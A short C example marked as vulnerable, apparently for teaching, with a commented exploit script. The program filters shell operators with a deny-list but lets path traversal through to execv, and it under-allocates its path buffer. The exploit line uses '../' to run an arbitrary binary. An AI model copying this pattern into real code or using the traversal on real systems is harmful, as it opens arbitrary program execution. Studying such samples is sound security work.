// program.c (vulnerable)
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pwd.h>

#define PREFIX_DIR "/path/to/"
#define DEVBIN_DIR "/devel/bin/"

int main(int argc, char *argv[]) {
    char *path = NULL;

    if (argc < 2) {
        fprintf(stderr, "Missing command\n");
        exit(1);
    }

    if (strchr(argv[1], '|') || strchr(argv[1], ';') ||
        strchr(argv[1], '`') || strchr(argv[1], '&') ||
        strchr(argv[1], '>') || strchr(argv[1], '<')) {
        
        fprintf(stderr, "Command contains prohibited characters\n");
        exit(1);
    }

    if ((path = malloc(strlen(PREFIX_DIR) + 2 + strlen(DEVBIN_DIR) + strlen(argv[1]) + 1)) == NULL) {
        fprintf(stderr, "Out of memory\n");
        exit(1);
    }

    sprintf(path, "%s%d%s%s", PREFIX_DIR, getegid() - 3000, DEVBIN_DIR, argv[1]);
    printf("Executing: %s\n", path);
    execv(path, &argv[1]);

    fprintf(stderr, "Failed to execute command %s\n", path);
    exit(1);
}

// exploit.sh
// #!/bin/bash
// /path/to/program "../../../../../path/to/malicious/program"
